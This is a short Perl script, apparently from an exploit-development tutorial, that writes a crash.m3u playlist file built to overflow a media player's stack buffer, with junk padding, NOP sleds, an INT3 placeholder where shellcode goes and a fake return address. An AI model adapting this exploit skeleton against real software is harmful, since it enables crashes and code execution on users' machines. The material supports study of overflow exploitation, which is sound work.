#! /usr/bin/perl

my $file= "crash.m3u";
my $buffersize = 26072;


my $junk= "A" x 44;
my $nop = "\x90" x 20;
my $shellcode = "\xcc";

my $restofbuffer = "A" x ($buffersize-(length($junk)+length($nop)+length($shellcode)));

my $eip = "\x42" x 4;

my $preshellcode = "X" x 54;  #let's pretend this is the only space we have available
my $nop2 = "\x90" x 20;


my $buffer = $junk.$nop.$shellcode.$restofbuffer;

print "Size of buffer : ".length($buffer)."\n";


open($FILE,">$file");
print $FILE $buffer.$eip.$preshellcode.$nop2;
close($FILE);
print "m3u File Created successfully\n";
